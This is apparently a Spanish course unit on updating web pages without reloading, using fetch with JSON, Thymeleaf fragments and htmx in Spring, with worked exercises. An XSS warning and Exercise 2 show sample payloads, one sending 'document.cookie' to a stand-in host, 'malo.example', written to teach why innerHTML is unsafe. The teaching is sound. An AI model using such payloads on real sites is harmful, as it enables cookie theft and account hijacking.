# Modificar la página sin recargarla

El currículo lo pide con estas palabras: *«generar páginas web que incluyan **modificación dinámica de su contenido y su estructura**»* y *«**obtención remota de información**»*.

Traducido: el usuario escribe en un buscador y la tabla se filtra sola. Pulsa «añadir» y aparece una fila nueva. Marca un favorito y el corazón cambia. **Sin que la página parpadee.**

Hay dos formas de conseguirlo, y las dos entran.

## 1. La forma clásica: `fetch` y JSON

La API de la UT6 ya está ahí. Se llama desde JavaScript y se pinta el resultado:

```javascript
async function buscar(texto) {
  const r = await fetch(`/api/v1/productos?nombre=${encodeURIComponent(texto)}`);
  if (!r.ok) { mostrarError(r.status); return; }
  const pagina = await r.json();

  document.querySelector('#tabla tbody').innerHTML = pagina.content
      .map(p => `<tr><td>${escapar(p.nombre)}</td><td>${p.precio} €</td></tr>`)
      .join('');
}
```

Funciona, es el modelo mental de cualquier SPA, y hay que saber hacerlo. Pero fíjate en lo que ha pasado: **acabas de escribir el HTML de la fila por segunda vez**, una en Thymeleaf y otra en JavaScript. El día que añadas una columna tendrás que acordarte de las dos.

Y hay un peligro peor, en esa función `escapar` que he tenido que inventarme:

!!! danger "`innerHTML` con datos del usuario es XSS"
    Si un producto se llama `<img src=x onerror="fetch('/api/v1/usuarios').then(...)">` y lo metes por `innerHTML`, el navegador **ejecuta ese código**.

    En Thymeleaf esto no pasaba: `th:text` escapa por defecto. Al montar HTML en JavaScript pierdes esa red de seguridad y la responsabilidad pasa a ser tuya.

    Alternativas seguras: `textContent` en vez de `innerHTML`, o construir los nodos con `document.createElement`.

## 2. La forma que encaja con SSR: devolver fragmentos

Si el servidor ya sabe pintar la tabla, ¿por qué pintarla otra vez en el cliente? **Que devuelva el trozo de HTML ya montado.**

Thymeleaf permite responder con un fragmento suelto:

```java
@GetMapping("/productos/filas")
public String filas(@RequestParam(required = false) String nombre, Model modelo) {
    modelo.addAttribute("productos", servicio.buscar(nombre));
    return "productos/lista :: filas";      // ← solo el fragmento, no la página
}
```

```html title="productos/lista.html"
<tbody th:fragment="filas">
    <tr th:each="p : ${productos}">
        <td th:text="${p.nombre}">Teclado</td>
        <td th:text="${p.precio} + ' €'">29,90 €</td>
    </tr>
    <tr th:if="${#lists.isEmpty(productos)}">
        <td colspan="2">Sin resultados</td>
    </tr>
</tbody>
```

Y en el cliente:

```javascript
const html = await (await fetch(`/productos/filas?nombre=${t}`)).text();
document.querySelector('#tabla tbody').outerHTML = html;
```

**Una sola definición de la fila**, en Thymeleaf, escapada por defecto. Cambias la columna en un sitio y cambia en los dos usos.

## 3. htmx: lo mismo, sin escribir JavaScript

Ese patrón —pedir un fragmento y sustituir un trozo del DOM— es tan repetitivo que existe una librería de 14 kB que lo hace con atributos HTML. Se llama **htmx** y encaja con Spring como un guante.

```html
<script src="https://unpkg.com/htmx.org@2.0.4"></script>

<input type="search" name="nombre" placeholder="Buscar…"
       hx-get="/productos/filas"
       hx-trigger="keyup changed delay:300ms"
       hx-target="#cuerpo"
       hx-swap="outerHTML">

<table>
    <tbody id="cuerpo" th:replace="~{productos/lista :: filas}"></tbody>
</table>
```

Cuatro atributos y ni una línea de JavaScript:

| Atributo | Qué dice |
|---|---|
| `hx-get` | a qué URL pedir |
| `hx-trigger` | cuándo (aquí: al teclear, con 300 ms de espera) |
| `hx-target` | qué elemento se cambia |
| `hx-swap` | cómo se cambia (`innerHTML`, `outerHTML`, `beforeend`…) |

El `delay:300ms` es importante y se llama *debounce*: sin él lanzarías una petición por cada tecla pulsada.

Borrar una fila sin recargar:

```html
<button hx-delete="/productos/5"
        hx-target="closest tr"
        hx-swap="outerHTML"
        hx-confirm="¿Seguro que quieres borrarlo?">Borrar</button>
```

```java
@DeleteMapping("/productos/{id}")
@ResponseBody
public String borrar(@PathVariable Long id) {
    servicio.borrar(id);
    return "";                    // respuesta vacía = la fila desaparece
}
```

!!! warning "CSRF con htmx"
    Las peticiones de htmx también necesitan el token, o Spring Security devolverá 403. Se configura una vez, en el `<head>`:

    ```html
    <meta name="_csrf" th:content="${_csrf.token}">
    <meta name="_csrf_header" th:content="${_csrf.headerName}">
    <script>
      document.body.addEventListener('htmx:configRequest', e => {
        e.detail.headers[document.querySelector('meta[name=_csrf_header]').content]
          = document.querySelector('meta[name=_csrf]').content;
      });
    </script>
    ```

## 4. Elegir entre las tres

| | `fetch` + JSON | Fragmentos a mano | htmx |
|---|:-:|:-:|:-:|
| JavaScript que escribes | Bastante | Poco | Ninguno |
| Duplicas la plantilla | **Sí** | No | No |
| Riesgo de XSS | Tuyo | Del motor | Del motor |
| Sirve para app móvil nativa | **Sí** | No | No |
| Interacción muy compleja | **Sí** | Regular | Regular |

La decisión honesta: **si el cliente es solo tu web, fragmentos o htmx**; si además hay una app móvil o un tercero consumiendo, necesitas la API JSON de todas formas, y entonces conviene reutilizarla.

Y no son excluyentes. Lo normal en un proyecto real es tener la API REST para integraciones y usar fragmentos para la web propia. **Mismo servicio, dos controladores, dos formatos.** Otra vez la arquitectura de la UT4.

## 5. Un caso completo: el carrito

Pongámoslo junto. Añadir al carrito y que el contador de la cabecera se actualice.

```html title="fragmentos/ui.html"
<span th:fragment="contador" id="contador" th:text="${#lists.size(carrito)}">0</span>
```

```html
<!-- en la ficha del producto -->
<button hx-post="/carrito/anadir"
        th:hx-vals="|{&quot;id&quot;: ${p.id}}|"
        hx-target="#contador"
        hx-swap="outerHTML">Añadir al carrito</button>
```

```java
@PostMapping("/carrito/anadir")
public String anadir(@RequestParam Long id, HttpSession sesion, Model modelo) {
    carritoServicio.anadir(sesion, id);
    modelo.addAttribute("carrito", carritoServicio.ver(sesion));
    return "fragmentos/ui :: contador";
}
```

La sesión viene de la UT7. El servicio, de la UT4. La plantilla, del tema 3. Aquí solo se ha añadido el pegamento.

## 6. Cuándo NO hacer esto

La modificación dinámica es una herramienta, no un objetivo. Tres avisos:

**No rompas el botón «atrás».** Si el usuario filtra, entra en un producto y vuelve, espera encontrar su filtro. Con htmx se resuelve con `hx-push-url="true"`, que refleja el estado en la URL.

**No dejes la página inutilizable sin JavaScript.** El enfoque correcto se llama *mejora progresiva*: la página funciona con enlaces y formularios normales, y el JavaScript la hace más cómoda. Un buscador que además tiene su `<form method="get">` funciona en los dos mundos.

**No confundas rápido con inmediato.** Una petición sigue siendo una petición. Si el usuario no ve ninguna señal de que algo está pasando, cree que la aplicación se ha colgado:

```html
<div class="cargando" hx-indicator>Buscando…</div>
```

## Pruébalo ahora (15 min)

!!! reto "Trabaja tú ahora"
    Este bloque se hace **en clase, en tu equipo**. No se entrega ni puntúa: es la práctica que hace que el examen te salga.

Un buscador que filtra mientras escribes, **sin escribir JavaScript**. Tres piezas.

``` { .java .numerado title="BuscadorController.java" }
@Controller
public class BuscadorController {

    private final List<String> ciudades = List.of(
        "Madrid", "Barcelona", "Valencia", "Sevilla", "Zaragoza",
        "Málaga", "Murcia", "Palma", "Bilbao", "Alicante");

    @GetMapping("/buscador")
    public String pagina(Model modelo) {
        modelo.addAttribute("resultados", ciudades);
        return "buscador";
    }

    // Devuelve SOLO el trozo de HTML de los resultados, no la página entera
    @GetMapping("/buscador/resultados")
    public String resultados(@RequestParam(defaultValue = "") String q, Model modelo) {
        modelo.addAttribute("resultados", ciudades.stream()
                .filter(c -> c.toLowerCase().contains(q.toLowerCase()))
                .toList());
        return "buscador :: resultados";        // plantilla :: fragmento
    }
}
```

``` { .html .numerado title="templates/buscador.html" }
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <script src="https://unpkg.com/htmx.org@2.0.4"></script>
</head>
<body>
    <h1>Ciudades</h1>

    <input type="search" name="q" placeholder="Escribe para filtrar…"
           hx-get="/buscador/resultados"
           hx-target="#resultados"
           hx-trigger="keyup changed delay:300ms, search">

    <ul id="resultados" th:fragment="resultados">
        <li th:each="c : ${resultados}" th:text="${c}">Madrid</li>
        <li th:if="${#lists.isEmpty(resultados)}">Sin resultados</li>
    </ul>
</body>
</html>
```

Ábrelo y escribe «ma». La lista se filtra sola.

Ahora lo importante, **con la pestaña Red del navegador abierta**:

1. Mira lo que devuelve `/buscador/resultados?q=ma`: es **HTML**, no JSON. Cinco líneas de `<li>`.
2. Escribe muy rápido y fíjate en que **no** sale una petición por tecla: eso es `delay:300ms`.
3. Quita el `delay:300ms` y repite. Ahora sí hay una petición por pulsación.
4. **Desactiva JavaScript** en el navegador y recarga. La página sigue mostrando las diez ciudades: el servidor las pintó. Eso es mejora progresiva.

---

## Ejercicios (con solución)

### Ejercicio 1 — Fragmento o JSON

¿Qué ventaja tiene devolver un fragmento HTML en vez de JSON, si el cliente es tu propia web?

??? success "Solución"

    Que **el HTML solo se escribe una vez**, en la plantilla, y sirve para la carga inicial y para las actualizaciones.

    Con JSON hay dos versiones del mismo marcado: la de Thymeleaf, que pinta la página al entrar, y la de JavaScript, que la vuelve a pintar al filtrar. Cuando cambie el diseño hay que tocar las dos, y en cuanto se olvide una, la tabla se ve de dos maneras distintas según cómo hayas llegado.

    Otras dos ventajas:

    - **Se acabó el formateo duplicado.** Fechas, decimales e idiomas ya los resuelve Thymeleaf con `#temporals` y `#numbers`. En JavaScript habría que repetirlo.
    - **No hay que serializar nada.** Ni DTO de respuesta, ni preocuparse de qué campos se filtran al cliente.

    JSON gana cuando el cliente **no** es tu web: una app móvil, otro sistema, o una interfaz hecha con un framework de cliente.

### Ejercicio 2 — `innerHTML` frente a `th:text`

¿Por qué `innerHTML` con datos del usuario es peligroso y `th:text` no?

??? success "Solución"

    `th:text` **escapa** el contenido: convierte `<` en `&lt;` antes de escribirlo. Lo que llegue se ve como texto, siempre.

    `elemento.innerHTML = dato` le dice al navegador *«interpreta esto como HTML»*. Si el dato lo escribió un usuario:

    ```js
    lista.innerHTML = '<li>' + comentario + '</li>';
    ```

    y el comentario es `<img src=x onerror="fetch('http://malo.example/'+document.cookie)">`, ese código se ejecuta en el navegador de quien mire la página. Es un XSS.

    La versión segura en JavaScript es `textContent`, que no interpreta nada:

    ```js
    const li = document.createElement('li');
    li.textContent = comentario;      // seguro
    lista.append(li);
    ```

    Es exactamente el mismo par que `th:text` frente a `th:utext`, en el lado del cliente.

### Ejercicio 3 — Los cuatro atributos de htmx

Explica `hx-get`, `hx-target`, `hx-trigger` y `hx-swap`.

??? success "Solución"

    | Atributo | Qué contesta |
    |---|---|
    | `hx-get="/ruta"` | **A dónde** se pide. Hay también `hx-post`, `hx-put`, `hx-delete` |
    | `hx-target="#id"` | **Dónde** se mete lo que vuelve. Sin él, en el propio elemento |
    | `hx-trigger="..."` | **Cuándo** se dispara: `click`, `keyup`, `change`, `load`, `every 5s`… |
    | `hx-swap="innerHTML"` | **Cómo** se coloca: dentro (`innerHTML`, por defecto), sustituyendo el elemento (`outerHTML`), antes o después (`beforeend`, `afterend`) |

    Todo junto:

    ```html
    <button hx-post="/carrito/3"
            hx-target="#contador"
            hx-swap="innerHTML">Añadir</button>
    ```

    Que se lee del tirón: *«al pulsar, haz un POST a `/carrito/3` y mete la respuesta dentro de `#contador`»*. Cero JavaScript.

### Ejercicio 4 — `delay:300ms`

¿Para qué sirve en `hx-trigger`?

??? success "Solución"

    Para **esperar a que el usuario deje de escribir** antes de lanzar la petición. Es lo que en inglés se llama *debounce*.

    ```html
    hx-trigger="keyup changed delay:300ms"
    ```

    Sin él, escribir «Madrid» son seis peticiones al servidor, y las cinco primeras no le importan a nadie. Con él, se lanza una sola, 300 ms después de la última tecla.

    Y hay un problema peor que el gasto: **las respuestas pueden llegar desordenadas**. La de «Madri» puede llegar después de la de «Madrid» y dejar en pantalla los resultados equivocados.

    El `changed` va con lo mismo: no dispara si el valor no ha cambiado, así que las flechas y el tabulador no cuentan.

### Ejercicio 5 — htmx devuelve 403

Tus peticiones htmx devuelven 403 desde que activaste la seguridad. ¿Qué falta?

??? success "Solución"

    El **testigo CSRF**. htmx no envía formularios: hace peticiones desde JavaScript, así que no se beneficia del campo oculto que pone `th:action`.

    Se resuelve publicando el testigo en el `<head>` y diciéndole a htmx que lo mande en cada petición:

    ```html
    <head>
        <meta name="_csrf"        th:content="${_csrf.token}">
        <meta name="_csrf_header" th:content="${_csrf.headerName}">
    </head>
    <body hx-headers='js:{"X-CSRF-TOKEN": document.querySelector("meta[name=_csrf]").content}'>
    ```

    Al ponerlo en el `<body>`, **todas** las peticiones de la página lo heredan.

    Ojo: solo afecta a `POST`, `PUT`, `PATCH` y `DELETE`. Un `hx-get` no necesita testigo, porque un GET no debería cambiar nada.

### Ejercicio 6 — Mejora progresiva

¿Qué es y cómo la aplicarías a un buscador?

??? success "Solución"

    Que **la página funcione sin JavaScript**, y que el JavaScript solo la mejore.

    En un buscador: primero se hace el formulario de toda la vida, que envía y recarga.

    ```html
    <form th:action="@{/buscador}" method="get">
        <input type="search" name="q" th:value="${q}">
        <button type="submit">Buscar</button>
    </form>
    ```

    Y **encima** se le añade htmx, sin quitar nada:

    ```html
    <form th:action="@{/buscador}" method="get"
          hx-get="/buscador/resultados"
          hx-target="#resultados"
          hx-trigger="keyup changed delay:300ms from:input, submit">
    ```

    Si htmx carga, filtra al escribir. Si no carga —conexión mala, JavaScript bloqueado, un buscador rastreando— el botón sigue funcionando y la página sigue siendo útil.

    Lo contrario, que es lo habitual, es un `<div id="app">` vacío: sin JavaScript no hay absolutamente nada.

### Ejercicio 7 — Web y app móvil

Un proyecto tiene web y aplicación móvil. ¿Fragmentos o JSON? Justifícalo.

??? success "Solución"

    **Las dos cosas, y no es una respuesta escurridiza:** son dos clientes con necesidades distintas.

    - La **app móvil** necesita JSON. Pinta con sus propios componentes nativos; el HTML no le sirve de nada.
    - La **web** puede seguir con fragmentos, y le conviene: se ahorra duplicar el marcado.

    Lo que **no** se duplica es la lógica. Se comparten el servicio y el DTO, y solo cambia el controlador:

    ```java
    @RestController                    // para la app
    @RequestMapping("/api/productos")
    class ProductoApi {
        @GetMapping List<ProductoDto> listar() { return servicio.listar(); }
    }

    @Controller                        // para la web
    @RequestMapping("/productos")
    class ProductoWeb {
        @GetMapping String listar(Model m) {
            m.addAttribute("productos", servicio.listar());
            return "productos/lista";
        }
    }
    ```

    Mismo servicio, mismo DTO, dos presentaciones. Y esto es justo la **aplicación híbrida** de la UT9.

    La respuesta perezosa —«JSON para todo, y la web que lo pinte con JavaScript»— es defendible, pero paga el precio de la UT8 entero: pierdes el renderizado en servidor, y con él los buscadores y la primera pantalla rápida.
